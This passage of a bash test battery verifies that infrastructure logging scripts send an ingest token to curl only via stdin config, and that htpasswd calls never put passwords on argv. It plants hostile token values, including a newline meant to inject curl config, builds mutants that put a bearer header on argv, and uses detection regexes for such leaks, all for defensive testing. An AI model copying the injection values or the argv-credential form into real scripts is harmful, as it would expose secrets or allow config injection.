  [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 0 && "$(s4_markers)" == 1 ]] && grep -qxF -- "SOLEUR_CREDENTIAL_REFUSED script=$1 reason=$2" "$S4_ROW/stderr" \
    && ! grep -q '^SOLEUR_CREDENTIAL_REFUSED' "$S4_ROW/stdout" && s4_said "$3" && ! s4_said 'egress' && ! s4_said 'FAILED' && s5_canary_clean
}
# ---- Guard 1: the template's posting population, derived (set identity by script), and the byte-equal judge ----
s5_reg_census_py='
import sys, re, yaml
d = yaml.safe_load(open(sys.argv[1]))
blocks = {}; dups = []
def add(name, c):
    if name in blocks: dups.append(name)
    blocks[name] = c
for f in d.get("write_files", []):
    c = f.get("content", "")
    if "betterstack_ingest_url" in c: add(f["path"].rsplit("/", 1)[-1].removesuffix(".sh"), c)
for r in d.get("runcmd", []):
    if isinstance(r, str) and "betterstack_ingest_url" in r: add("zot-log-boot", r)
for name in dups: print("DUPLICATE-KEY", name)
for name in sorted(blocks):
    text = re.sub(r"\\\n[ \t]*", " ", blocks[name])
    n = 0; bad = []
    for line in text.split("\n"):
        if line.lstrip().startswith("#") or "curl " not in line or "betterstack_ingest_url" not in line: continue
        n += 1
        if re.search(r"-H\s+[\"\x27]?Authorization", line) or re.search(r"(^|\s)(-u|--user)\s", line): bad.append("credential-header-on-argv")
        for need in ("--disable", "--noproxy", "--config -"):
            if need not in line: bad.append("missing " + need)
    live = "\n".join(l for l in text.split("\n") if not l.lstrip().startswith("#"))
    asg = len(re.findall(r"\$+\{?BETTERSTACK_LOGS_TOKEN", live))   # every EXPANSION of the raw variable, in any spelling
    print(name, n, ",".join(sorted(set(bad))) or "-", asg)
'
s5_reg_census() { python3 -I -c "$s5_reg_census_py" "$1"; } # <yml> -> "<script> <posting curls> <violations>" per script
S5_CENSUS_WANT="$(printf '%s\n' 'soleur-private-nic-guard 1 - 1' 'zot-disk-heartbeat 1 - 1' 'zot-log-boot 1 - 1' 'zot-log-shipper 1 - 1')"
S5_CENSUS_GOT="$(s5_reg_census "$REPO_ROOT/$S5_REG")"
S5_CENSUS_N="$(awk '{n += $2} END {print n + 0}' <<<"$S5_CENSUS_GOT")"
S5_CENSUS_FLOOR=4
if [[ "$S5_CENSUS_GOT" == "$S5_CENSUS_WANT" && "$S5_CENSUS_N" -ge "$S5_CENSUS_FLOOR" ]]; then row "S5 Guard 1 (registry): the derived posting population is exactly the four scripts, each with ONE posting curl that carries no credential header of its own and has --disable, --noproxy and --config - ($S5_CENSUS_N statements; anti-vacuity floor $S5_CENSUS_FLOOR)" ok
else row "S5 Guard 1 (registry): the derived posting population differs from the four scripts, or a posting curl carries the credential on argv" fail "got='${S5_CENSUS_GOT//$'\n'/;}'"; fi
S5_REG_LINT2="$(python3 scripts/lint-shell-trace-credential-refusal.py "$S5_REG" 2>&1)"
if grep -q '^OK:' <<<"$S5_REG_LINT2"; then row "S5 Guard 1 (registry): Rule E on the explicit path of the registry template reports no curl with a credential header of its own" ok
else row "S5 Guard 1 (registry): the registry template still has curl commands that carry a credential header" fail "$(tail -1 <<<"$S5_REG_LINT2")"; fi
# Mutation 2: a SECOND credentialed curl in a script (after a compliant first) is judged RED by the census (a per-script set, not "at least one clean").
S5_REG_MUT="$S4/s5reg/mut-census.yml"
python3 -I -c '
import sys
t = open(sys.argv[1]).read()
needle = "        post_body \"$body\" && return 0\n"
if needle not in t: sys.exit(3)
t = t.replace(needle, needle + "        curl -fsS -m 10 -H \"Authorization: Bearer $TOKEN\" -H \"Content-Type: application/json\" \"${betterstack_ingest_url}\" --data-raw \"$body\"\n", 1)
open(sys.argv[2], "w").write(t)' "$REPO_ROOT/$S5_REG" "$S5_REG_MUT" || fatal "S5 could not build the second-curl mutant"
S5_CENSUS_MUT="$(s5_reg_census "$S5_REG_MUT")"
if [[ "$S5_CENSUS_MUT" != "$S5_CENSUS_WANT" && "$S5_CENSUS_MUT" == *'zot-log-shipper 2 credential-header-on-argv'* ]]; then row "S5 Guard 1 mutation 2 (registry): a second, credentialed curl added to the shipper after a compliant first is judged RED by the per-script census" ok
else row "S5 Guard 1 mutation 2 (registry): a second credentialed curl is not caught" fail "got='${S5_CENSUS_MUT//$'\n'/;}'"; fi
# The judge is ONE text in four places: byte-equal (the parity audit), and it is the library's alphabet.
s5_reg_parity() { # <yml> -> prints OK when the four `_bs_ok` lines are byte-equal and the three `post()` lines are byte-equal; else a reason
  python3 -I -c '
import sys, re
t = open(sys.argv[1]).read().split("\n")
ok = [l.strip() for l in t if l.strip().startswith("_bs_ok() {")]
post = [l.strip() for l in t if l.strip().startswith("post() { curl")]
if len(ok) != 4: print("judge-copies=%d" % len(ok)); sys.exit(0)
if len(set(ok)) != 1: print("judge-copies-differ"); sys.exit(0)
if len(post) != 3: print("post-copies=%d" % len(post)); sys.exit(0)
if len(set(post)) != 1: print("post-copies-differ"); sys.exit(0)
trim = [l.strip() for l in t if l.strip().startswith("TOKEN=\"$${TOKEN%")]
if len(trim) != 4 or len(set(trim)) != 1: print("trim-copies-differ"); sys.exit(0)
mk = [re.sub(r"script=[a-z-]+", "script=X", l.strip()) for l in t if l.strip().startswith("printf \x27SOLEUR_CREDENTIAL_REFUSED script=")]
if len(mk) != 4 or len(set(mk)) != 1: print("marker-copies-differ"); sys.exit(0)
print("OK")' "$1"
}
S5_PAR="$(s5_reg_parity "$REPO_ROOT/$S5_REG")"
S5_PAR_MUT="$S4/s5reg/mut-parity.yml"
python3 -I -c '
import sys
t = open(sys.argv[1]).read()
a = "_bs_ok() { local LC_ALL=C; case"
i = t.index(a, t.index(a) + 10)
open(sys.argv[2], "w").write(t[:i] + "_bs_ok() { local LC_ALL=C ; case" + t[i + len(a):])' "$REPO_ROOT/$S5_REG" "$S5_PAR_MUT" || fatal "S5 could not build the parity mutant"
if [[ "$S5_PAR" == OK && "$(s5_reg_parity "$S5_PAR_MUT")" == judge-copies-differ ]] && ! cmp -s "$REPO_ROOT/$S5_REG" "$S5_PAR_MUT"; then row "S5 Guard 1 parity (registry): the four copies of the judge and the three post() copies are byte-equal, and one changed byte in one judge copy is judged RED" ok
else row "S5 Guard 1 parity (registry): the copies differ, or the audit is blind to one changed byte" fail "real='$S5_PAR' mutant='$(s5_reg_parity "$S5_PAR_MUT")'"; fi
S5_JUDGE="$(grep -m1 '_bs_ok() {' "$REPO_ROOT/$S5_REG" | sed 's/^[[:space:]]*//; s/\$\$/$/g')"
S5_CANON="$(grep -m1 '^_bearer_ok() {' apps/web-platform/infra/web-private-nic-guard.sh)"
S5_JUDGE_BAD=""
if [[ "${S5_JUDGE/_bs_ok/_bearer_ok}" != "$S5_CANON" || -z "$S5_CANON" ]]; then S5_JUDGE_BAD+=" not-the-canonical-body"; fi
S5_JD="$(eval "$S5_JUDGE"; for v in 'abc.DEF-1_2~3+/=' 'x'; do _bs_ok "$v" || printf 'rejected-good:%s ' "$v"; done; for v in '' 'a b' 'a"b' $'a\nb' 'a\b' 'a;b' 'a$b' 'é' $'a\tb' 'a#b' "a'b" 'a,b' 'a`b' $'a\rb'; do _bs_ok "$v" && printf 'accepted-bad ' || true; done)"
[[ -z "$S5_JD" ]] || S5_JUDGE_BAD+=" behaviour:$S5_JD"
if [[ -z "$S5_JUDGE_BAD" ]]; then row "S5 Guard 1 (registry): the host judge is byte-identical to the canonical inline _bearer_ok (modulo the template escape and the name), accepts the library's token alphabet and rejects an empty value, a space, a quote, a backslash, a newline, a tab, a semicolon, a dollar sign and a non-ASCII byte" ok
else row "S5 Guard 1 (registry): the host judge differs from the canonical body or misjudges a value" fail "$S5_JUDGE_BAD"; fi

# ---- bash -n over EVERY rendered script and runcmd block (an escape error in the template cannot pass on raw text) ----
S5_SYN="$(python3 -I -c '
import sys, re, yaml, subprocess
d = yaml.safe_load(open(sys.argv[1]))
URL = "https://s5-ingest.example.invalid/"
def render(t):
    t = t.replace("${betterstack_ingest_url}", URL)
    t = re.sub(r"(?<!\$)\$\{[a-z_][a-z0-9_]*\}", "stub", t)
    return t.replace("$${", "${").replace("%%{", "%{")
n = 0; bad = []
for f in d.get("write_files", []):
    c = f.get("content", "")
    if c.startswith("#!") and "bash" in c.split("\n")[0]:
        n += 1
        if subprocess.run(["bash", "-n"], input=render(c).encode(), capture_output=True).returncode: bad.append(f["path"])
for i, r in enumerate(d.get("runcmd", [])):
    if isinstance(r, str) and "\n" in r:
        n += 1
        if subprocess.run(["bash", "-n"], input=render(r).encode(), capture_output=True).returncode: bad.append("runcmd[%d]" % i)
print(n, ",".join(bad) or "-")' "$REPO_ROOT/$S5_REG")"
S5_SYN_N="${S5_SYN%% *}"; S5_SYN_BAD="${S5_SYN#* }"; S5_SYN_FLOOR=12
if [[ "$S5_SYN_BAD" == - && "$S5_SYN_N" -ge "$S5_SYN_FLOOR" ]]; then row "S5 registry render: every rendered bash script and multi-line runcmd block passes bash -n ($S5_SYN_N checked; anti-vacuity floor $S5_SYN_FLOOR)" ok
else row "S5 registry render: a rendered script or runcmd block is not valid bash, or the population is below its floor" fail "n=$S5_SYN_N bad=$S5_SYN_BAD floor=$S5_SYN_FLOOR"; fi

# ---- Guard 2: execute the committed posting regions ----
S5_HOSTILE_NL="${S5_CANARY}"$'\nx'          # an interior newline (the config-injection byte) with the canary planted
for k in hb nic; do
  case "$k" in
    hb)  n="zot-disk-heartbeat";        warn='WARN: BETTERSTACK_LOGS_TOKEN refused';  unset_warn="WARN: BETTERSTACK_LOGS_TOKEN unset" ;;
    nic) n="soleur-private-nic-guard";  warn='WARN: BETTERSTACK_LOGS_TOKEN refused';  unset_warn="WARN: BETTERSTACK_LOGS_TOKEN unset" ;;
  esac
  s5_reg_body "$k" "$S5R/r-$k.sh"
  s5_reg_exec "$k-hz" "$k" "$S5R/r-$k.sh" BETTERSTACK_LOGS_TOKEN="$S5_HZ"
  if s5_reg_ok "$S5_HZ" 1; then row "S5 Guard 2 (registry $n): a 64-character alphanumeric ingest token is posted once, on curl's stdin config only, to the pinned URL, and the script exits 0" ok
  else row "S5 Guard 2 (registry $n): a valid token is not posted on stdin only" fail "rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers)"; fi
  s5_reg_exec "$k-bs" "$k" "$S5R/r-$k.sh" BETTERSTACK_LOGS_TOKEN="$S5_BS"
  if s5_reg_ok "$S5_BS" 1; then row "S5 Guard 2 (registry $n): a Better Stack-shaped token holding an underscore and hyphens is accepted" ok
  else row "S5 Guard 2 (registry $n): a realistic token is refused or mis-sent" fail "rc=$S4_RC calls=$(s4_ncalls)"; fi
  s5_reg_exec "$k-hostile" "$k" "$S5R/r-$k.sh" BETTERSTACK_LOGS_TOKEN="$S5_BAD"; S5_REFUSALS=$((S5_REFUSALS + 1))
  if s5_reg_refused_ok "$n" token_shape "$warn"; then row "S5 Guard 2 (registry $n): a token holding a quote and a space makes no request, prints ONE marker naming the script, takes the not-shipped branch (never the egress-FAILED retry branch) and the script still exits 0" ok
  else row "S5 Guard 2 (registry $n): a refused token reaches the wrong branch or changes the exit status" fail "rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers) err='$(tr '\n' '|' < "$S4_ROW/stderr" | cut -c1-160)'"; fi
  s5_reg_exec "$k-ctl" "$k" "$S5R/r-$k.sh" BETTERSTACK_LOGS_TOKEN="$S5_HOSTILE_NL"; S5_REFUSALS=$((S5_REFUSALS + 1))
  if s5_reg_refused_ok "$n" control_char "$warn"; then row "S5 Guard 2 (registry $n): a token holding a newline is refused with reason=control_char (the config-injection byte) and makes no request" ok
  else row "S5 Guard 2 (registry $n): a token with a newline is not refused as control_char" fail "rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers)"; fi
  s5_reg_exec "$k-unset" "$k" "$S5R/r-$k.sh"
  if [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 0 && "$(s4_markers)" == 0 ]] && s4_said "$unset_warn"; then row "S5 Guard 2 (registry $n): an unset token keeps the existing arm (the unset WARN, no request, no marker, exit 0)" ok
  else row "S5 Guard 2 (registry $n): an unset token changed verdict" fail "rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers)"; fi
  # Mutation 5 (dispatch): drop the judge (always true); the hostile token then reaches curl and the no-request clause goes RED.
  s5_reg_body "$k" "$S5R/m-$k-nojudge.sh" '_bs_ok "$TOKEN"; then' 'true; then'
  s5_reg_exec "$k-nojudge" "$k" "$S5R/m-$k-nojudge.sh" BETTERSTACK_LOGS_TOKEN="$S5_BAD"; S5_REFUSALS=$((S5_REFUSALS + 1))
  if ! s5_reg_refused_ok "$n" token_shape "$warn" && [[ "$(s4_ncalls)" -ge 1 ]]; then row "S5 Guard 2 mutation 5 (registry $n): with the judge dropped a hostile token reaches curl and the shape row goes RED" ok
  else row "S5 Guard 2 mutation 5 (registry $n): a dropped judge is not caught" fail "calls=$(s4_ncalls)"; fi
  # Mutation 2: a refusal that skips the refused branch (it falls to the unset arm: no marker, the unset WARN) is judged RED by the not-shipped-branch row. The retry branch itself is reached only with a usable token (the egress-FAILED rows below).
  s5_reg_body "$k" "$S5R/m-$k-retry.sh" 'elif [ -n "$TOKEN" ]; then' 'elif false; then'
  s5_reg_exec "$k-retry" "$k" "$S5R/m-$k-retry.sh" BETTERSTACK_LOGS_TOKEN="$S5_BAD"; S5_REFUSALS=$((S5_REFUSALS + 1))
  if ! s5_reg_refused_ok "$n" token_shape "$warn"; then row "S5 Guard 2 mutation 2 (registry $n): a refusal that skips the refused branch (it falls to the unset arm: no marker, wrong WARN) is judged RED" ok
  else row "S5 Guard 2 mutation 2 (registry $n): a refusal moved into another branch is not caught" fail "markers=$(s4_markers)"; fi
done
# The boot block is fed to `bash -s` on stdin, so a bare `--config -` would read the rest of the script (the per-command redirect is the fix).
s5_reg_body boot "$S5R/r-boot.sh"
s5_reg_exec boot-hz boot "$S5R/r-boot.sh" BETTERSTACK_LOGS_TOKEN="$S5_HZ"
if s5_reg_ok "$S5_HZ" 1; then row "S5 Guard 2 (registry boot block): run through \`doppler run -- bash -s <<heredoc\` the block posts SOLEUR_ZOT_LOG_BOOT once, on stdin config only, and the heredoc is intact" ok
else row "S5 Guard 2 (registry boot block): the boot post is not sent on stdin only" fail "rc=$S4_RC calls=$(s4_ncalls) stdin='$(s4_stdin_line 1 1 | cut -c1-30)'"; fi
s5_reg_exec boot-hostile boot "$S5R/r-boot.sh" BETTERSTACK_LOGS_TOKEN="$S5_BAD"; S5_REFUSALS=$((S5_REFUSALS + 1))
if s5_reg_refused_ok zot-log-boot token_shape 'WARN: BETTERSTACK_LOGS_TOKEN refused'; then row "S5 Guard 2 (registry boot block): a refused token prints one marker naming zot-log-boot, makes no request and takes the not-shipped branch" ok
else row "S5 Guard 2 (registry boot block): a refused token reaches the wrong branch" fail "rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers)"; fi
# Mutation 7 (the heredoc row): drop the per-command redirect; `--config -` then reads the heredoc, so the recorded config holds script lines.
s5_reg_body boot "$S5R/m-boot-noredirect.sh" ' < <(printf '"'"'header = "Authorization: Bearer %s"\n'"'"' "$TOKEN")' ''
s5_reg_exec boot-noredirect boot "$S5R/m-boot-noredirect.sh" BETTERSTACK_LOGS_TOKEN="$S5_HZ"
if ! s5_reg_ok "$S5_HZ" 1; then row "S5 Guard 2 mutation 7 (registry boot block): dropping the per-command stdin redirect is judged RED (curl would read the heredoc as its config)" ok
else row "S5 Guard 2 mutation 7 (registry boot block): the dropped redirect is not caught" fail "calls=$(s4_ncalls)"; fi

# The shipper: the credential is judged ONCE per run (a refusal is one marker per five-minute run, not one per row).
s5_ship_valid_ok() { # three ship() calls: three requests, three zero statuses, no marker
  [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 3 && "$(s4_markers)" == 0 ]] && s4_calls_ok 1 && [[ "$(s4_stdin_line 1 1)" == "header = \"Authorization: Bearer $1\"" ]] \
    && s4_nowhere_on_argv "$1" && s4_said 'ship1 rc=0' && s4_said 'ship3 rc=0' && s5_canary_clean
}
s5_ship_refused_ok() { # [reason] three ship() calls over a refused token: no request, ONE marker, three not-shipped returns, the refused wording
  [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 0 && "$(s4_markers)" == 1 ]] && grep -qxF -- "SOLEUR_CREDENTIAL_REFUSED script=zot-log-shipper reason=${1:-token_shape}" "$S4_ROW/stderr" \
    && s4_said 'ship1 rc=1' && s4_said 'ship3 rc=1' && s4_said 'BETTERSTACK_LOGS_TOKEN refused' && ! s4_said 'unset; not shipped' && ! s4_said 'FAILED' && s5_canary_clean
}
s5_reg_body ship "$S5R/r-ship.sh"
s5_reg_exec ship-hz ship "$S5R/r-ship.sh" BETTERSTACK_LOGS_TOKEN="$S5_HZ"
if s5_ship_valid_ok "$S5_HZ"; then row "S5 Guard 2 (registry zot-log-shipper): three rows are posted one request each, on stdin config only, and ship() returns 0" ok
else row "S5 Guard 2 (registry zot-log-shipper): a valid token is not posted on stdin only" fail "rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers)"; fi
s5_reg_exec ship-hostile ship "$S5R/r-ship.sh" BETTERSTACK_LOGS_TOKEN="$S5_BAD"; S5_REFUSALS=$((S5_REFUSALS + 1))
if s5_ship_refused_ok; then row "S5 Guard 2 (registry zot-log-shipper): a refused token gives ONE marker for three rows (judged once per run), no request, three not-shipped returns, and the WARN says refused (not unset)" ok
else row "S5 Guard 2 (registry zot-log-shipper): the refusal is not once-per-run or reaches the wrong branch" fail "rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers)"; fi
s5_reg_exec ship-unset ship "$S5R/r-ship.sh"
if [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 0 && "$(s4_markers)" == 0 ]] && s4_said 'unset; not shipped' && s4_said 'ship2 rc=1'; then row "S5 Guard 2 (registry zot-log-shipper): an unset token keeps the existing arm (the unset WARN per row, no request, no marker)" ok
else row "S5 Guard 2 (registry zot-log-shipper): an unset token changed verdict" fail "rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers)"; fi
# Mutation 3 (once-per-run): move the judge into ship() so each row re-judges; three markers for three rows must be judged RED.
s5_reg_body ship "$S5R/m-ship-perrow.sh" 'if [ -n "$TOKEN" ] && ! _bs_ok "$TOKEN"; then' 'if false; then' \
  'local line="$1" body' 'local line="$1" body; if [ -n "$TOKEN" ] && ! _bs_ok "$TOKEN"; then printf '"'"'SOLEUR_CREDENTIAL_REFUSED script=zot-log-shipper reason=token_shape\n'"'"' >&2; TOKEN_REFUSED=1; fi'
s5_reg_exec ship-perrow ship "$S5R/m-ship-perrow.sh" BETTERSTACK_LOGS_TOKEN="$S5_BAD"; S5_REFUSALS=$((S5_REFUSALS + 1))
if ! s5_ship_refused_ok && [[ "$(s4_markers)" -gt 1 ]]; then row "S5 Guard 2 mutation 3 (registry zot-log-shipper): a judge moved inside ship() prints a marker per row and is judged RED by the once-per-run row" ok
else row "S5 Guard 2 mutation 3 (registry zot-log-shipper): a per-row judge is not caught" fail "markers=$(s4_markers)"; fi
# Mutation 4 (cron must not wedge): a refusal that changes the script's exit status.
s5_reg_body hb "$S5R/m-hb-exit.sh" 'elif [ -n "$TOKEN" ]; then' 'elif [ -n "$TOKEN" ]; then exit 3;'
s5_reg_exec hb-exit hb "$S5R/m-hb-exit.sh" BETTERSTACK_LOGS_TOKEN="$S5_BAD"; S5_REFUSALS=$((S5_REFUSALS + 1))
if ! s5_reg_refused_ok zot-disk-heartbeat token_shape 'WARN: BETTERSTACK_LOGS_TOKEN refused' && [[ "$S4_RC" != 0 ]]; then row "S5 Guard 2 mutation 4 (registry zot-disk-heartbeat): a refusal that changes the exit status is judged RED (the cron job must never wedge)" ok
else row "S5 Guard 2 mutation 4 (registry zot-disk-heartbeat): a changed exit status is not caught" fail "rc=$S4_RC"; fi

# ---- review-round rows (registry side): trailing whitespace, the egress-FAILED branch, control_char for every script, the single token read ----
# A stored value with trailing whitespace worked on the old argv form (curl sent the trimmed header), so it must still post, trimmed, from all four scripts.
for k in hb nic boot ship; do
  case "$k" in hb) n=zot-disk-heartbeat ;; nic) n=soleur-private-nic-guard ;; boot) n=zot-log-boot ;; ship) n=zot-log-shipper ;; esac
  S5_WS_BAD=""
  for ws in "$S5_HZ"$'\n' "$S5_HZ " "$S5_HZ"$'\t' "$S5_HZ"$'\r' "$S5_HZ"$'\r\n'; do
    s5_reg_exec "$k-ws" "$k" "$S5R/r-$k.sh" BETTERSTACK_LOGS_TOKEN="$ws"
    if [[ "$k" == ship ]]; then s5_ship_valid_ok "$S5_HZ" || S5_WS_BAD+=" ws"; else s5_reg_ok "$S5_HZ" 1 || S5_WS_BAD+=" ws"; fi
  done
  if [[ -z "$S5_WS_BAD" ]]; then row "S5 Guard 2 (registry $n): a token stored with a trailing newline, space or tab is trimmed and posted on stdin config (it worked on the old argv form, so it must not silently go dark)" ok
  else row "S5 Guard 2 (registry $n): a token with trailing whitespace is not posted trimmed" fail "bad=$(wc -w <<<"$S5_WS_BAD")"; fi
done
s5_reg_body nic "$S5R/m-nic-notrim.sh" 'TOKEN="$${TOKEN%"$${TOKEN##*[![:space:]]}"}"' ':'
s5_reg_exec nic-notrim nic "$S5R/m-nic-notrim.sh" BETTERSTACK_LOGS_TOKEN="$S5_HZ"$'\n'
if ! s5_reg_ok "$S5_HZ" 1; then row "S5 Guard 2 mutation (registry soleur-private-nic-guard): dropping the trim makes a trailing-newline token go dark, judged RED by the trailing-whitespace row" ok
else row "S5 Guard 2 mutation (registry soleur-private-nic-guard): a dropped trim is not caught" fail "calls=$(s4_ncalls)"; fi
# The egress-FAILED branch is the existing one: a valid token and a failing curl retries once and says so (and a refusal never reaches it, asserted above).
for k in hb nic boot; do
  case "$k" in hb) n=zot-disk-heartbeat ;; nic) n=soleur-private-nic-guard ;; boot) n=zot-log-boot ;; esac
  s5_reg_exec "$k-egress" "$k" "$S5R/r-$k.sh" BETTERSTACK_LOGS_TOKEN="$S5_HZ" SHIM_RC=22
  if [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 2 && "$(s4_markers)" == 0 ]] && s4_said 'FAILED'; then row "S5 Guard 2 (registry $n): a valid token and a failing curl takes the retry-once egress-FAILED branch (two requests, the FAILED line, exit status unchanged)" ok
  else row "S5 Guard 2 (registry $n): the egress-FAILED branch changed" fail "rc=$S4_RC calls=$(s4_ncalls)"; fi
done
# control_char for the two scripts the loop above does not reach, with the canary planted and the exact marker line on stderr only.
s5_reg_exec boot-ctl boot "$S5R/r-boot.sh" BETTERSTACK_LOGS_TOKEN="$S5_HOSTILE_NL"
if s5_reg_refused_ok zot-log-boot control_char 'WARN: BETTERSTACK_LOGS_TOKEN refused'; then row "S5 Guard 2 (registry boot block): a token holding a newline is refused with reason=control_char, exact marker line on stderr, no leak" ok
else row "S5 Guard 2 (registry boot block): a newline token is not refused as control_char" fail "rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers)"; fi
s5_reg_exec ship-ctl ship "$S5R/r-ship.sh" BETTERSTACK_LOGS_TOKEN="$S5_HOSTILE_NL"
if s5_ship_refused_ok control_char; then row "S5 Guard 2 (registry zot-log-shipper): a token holding a newline gives ONE control_char marker for three rows and no request" ok
else row "S5 Guard 2 (registry zot-log-shipper): a newline token is not refused as control_char once per run" fail "rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers)"; fi
# The shipper (like every posting script) reads the raw token ONCE: a second read after the judge would hand an unjudged value to the config channel.
S5_REG_MUT2="$S4/s5reg/mut-reread.yml"
python3 -I -c '
import sys
t = open(sys.argv[1]).read()
n = "      HOST_NAME_V=\"$(hostname)\"\n"
if t.count(n) != 1: sys.exit(3)
open(sys.argv[2], "w").write(t.replace(n, n + "      TOKEN=\"$${BETTERSTACK_LOGS_TOKEN:-}\"\n"))' "$REPO_ROOT/$S5_REG" "$S5_REG_MUT2" || fatal "S5 could not build the token re-read mutant"
if [[ "$(s5_reg_census "$S5_REG_MUT2")" == *'zot-log-shipper 1 - 2'* ]]; then row "S5 Guard 1 mutation (registry): a second raw read of the token after the judge in the shipper is judged RED by the single-assignment census" ok
else row "S5 Guard 1 mutation (registry): a re-read of the raw token is not caught" fail "got='$(s5_reg_census "$S5_REG_MUT2" | tr '\n' ';')'"; fi
S5_REG_MUT3="$S4/s5reg/mut-reread2.yml"
python3 -I -c '
import sys
t = open(sys.argv[1]).read()
n = "      HOST_NAME_V=\"$(hostname)\"\n"
if t.count(n) != 1: sys.exit(3)
open(sys.argv[2], "w").write(t.replace(n, n + "      TOKEN=\"$${BETTERSTACK_LOGS_TOKEN}\"\n"))' "$REPO_ROOT/$S5_REG" "$S5_REG_MUT3" || fatal "S5 could not build the token re-read mutant (no default operator)"
if [[ "$(s5_reg_census "$S5_REG_MUT3")" == *'zot-log-shipper 1 - 2'* ]]; then row "S5 Guard 1 mutation (registry): a second raw read of the token in a DIFFERENT spelling (no :- default) is judged RED by the every-expansion census" ok
else row "S5 Guard 1 mutation (registry): a differently spelled re-read of the raw token is not caught" fail "got='$(s5_reg_census "$S5_REG_MUT3" | tr '\n' ';')'"; fi
# The marker text is one text in four places too: change one copy's reason computation and the parity audit goes RED.
S5_PAR_MUT2="$S4/s5reg/mut-marker.yml"
python3 -I -c '
import sys
t = open(sys.argv[1]).read()
a = "*[[:cntrl:]]*) echo control_char ;;"
i = t.rindex(a)
open(sys.argv[2], "w").write(t[:i] + "*[[:cntrl:]]*) echo token_shape ;;" + t[i + len(a):])' "$REPO_ROOT/$S5_REG" "$S5_PAR_MUT2" || fatal "S5 could not build the marker parity mutant"
if [[ "$(s5_reg_parity "$S5_PAR_MUT2")" == marker-copies-differ ]]; then row "S5 Guard 1 parity (registry): the trim and the refusal marker are byte-equal across the four scripts, and one changed reason computation is judged RED" ok
else row "S5 Guard 1 parity (registry): a changed marker copy is not caught" fail "got='$(s5_reg_parity "$S5_PAR_MUT2")'"; fi
S5_REG_REFUSAL_FLOOR=14
if [[ $((S5_CANARY_RUNS - S5_REF_BASE)) -ge "$S5_REG_REFUSAL_FLOOR" ]]; then row "S5 negative canary (registry): $((S5_CANARY_RUNS - S5_REF_BASE)) runs of the registry regions planted the canary and had every captured stream searched for it (anti-vacuity floor $S5_REG_REFUSAL_FLOOR)" ok
else row "S5 negative canary (registry): the planted-canary run population is below its anti-vacuity floor" fail "runs=$((S5_CANARY_RUNS - S5_REF_BASE)) floor=$S5_REG_REFUSAL_FLOOR"; fi
echo "=== stage S5: Guard 1 and Guard 2 rows for the apply workflow and the registry template done ==="

# =====================================================================================
# STAGE S6 (argv-bearer sweep, Guard 3, #9757): no `htpasswd` invocation carries a password on argv.
#
# PROPERTY. No tracked, non-test, non-comment `htpasswd` invocation passes a password as an argument: no option cluster holds a lowercase `b`
# (`-b` is the password-on-the-command-line flag; `-B` is bcrypt and is fine, in any order and combination: -Bin, -iB, -vi pass; -Bbn, -Bb, -bi,
# -vb, -nbB and a split `-B -b` fail).
#
# DERIVATION. `git grep` (tracked AND untracked, so an uncommitted file is seen) over apps/, scripts/ and .github/, minus `*.test.sh` and `*.md`,
# for `htpasswd` followed by an option token; whole-line comments and trailing YAML comments (` # ...`) are dropped before the invocation is
# looked for. The scan is a FUNCTION OF A ROOT, so the mutation rows run the same text on a scratch repository. NOT COVERED, named: an invocation
# through a variable, an `eval` or a `bash -c` string whose `htpasswd` is not followed by an option on the same line, and an invocation hidden
# behind ` # ` inside a quoted string earlier on the same line.
#
# NO RESIDUAL. The registry template (apps/web-platform/infra/cloud-init-registry.yml: the `_htp_verify` probe and the two boot-step htpasswd lines)
# was carried here as an explicit residual allowlist (S6_ALLOW) while its conversion waited for its own PR, because merging that file replaces the
# production registry host unattended. #10119 converted all three sites and DELETED the allowlist: S6_ALLOW is empty and S6_ALLOW_CEIL is 0, so a site
# that goes back to argv form is `bad:<file>` with no entry to hide behind. The allowlist machinery stays (an entry the scan no longer sees is RED,
# "stale-allowlist"; the ceiling row pins the entry count) so growing it again is an edit to literals this stage asserts, never a quiet addition.
#
# FLOOR. The scan sees 4 invocations in 2 files on the real tree: 1 in the workflow + 3 in the registry template (the boot step's two entries and the
# probe), all stdin form. The floor is 4 sites in 2 files; it did not move when the allowlist was deleted.
# A scan that sees fewer (renamed binary, moved roots, a broken regex) is RED, never a clean bill.
#
# The executable rows run the REAL step text (PyYAML-extracted from the workflow, up to and including the htpasswd line) under
# `bash --noprofile --norc -eo pipefail` against a REFUSING stub `docker` that accepts exactly `run --rm -i httpd:2.4-alpine htpasswd -Bin <user>`
# and reads stdin: without docker's own `-i` docker forwards nothing and the hash covers an EMPTY password, and the step is dispatch-only, so
# nothing else would notice. The real-binary round trip lives in apps/web-platform/infra/htpasswd-stdin.test.sh (needs docker; this battery does not).
# All passwords are synthesized or per-run throwaways; no value is printed.
# =====================================================================================
S6_WF=".github/workflows/apply-web-platform-infra.yml"
S6_REG="apps/web-platform/infra/cloud-init-registry.yml"
S6_SITE_FLOOR=4; S6_FILE_FLOOR=2; S6_ALLOW_CEIL=0
S6_WF_LINE="$(cat <<'S6EOF'
printf '%s' "$RP" | docker run --rm -i httpd:2.4-alpine htpasswd -Bin "$RU" > "${RUNNER_TEMP}/zot/htpasswd"
S6EOF
)"
# The residual allowlist: <file><TAB><the whole stripped line>. EMPTY since #10119 deleted the three registry entries; it shrinks by deletion only.
S6_ALLOW=()
# The three registry-template sites, by identity (file and the whole stripped line), all stdin form.
S6_REG_PROBE="printf '%s' \"\$2\" | htpasswd -vi /etc/zot/htpasswd \"\$1\" >/dev/null 2>&1"
S6_REG_PULL="printf '%s' \"\$ZOT_PULL_TOKEN\" | htpasswd -Bin '\${zot_pull_user}'  > /etc/zot/htpasswd"
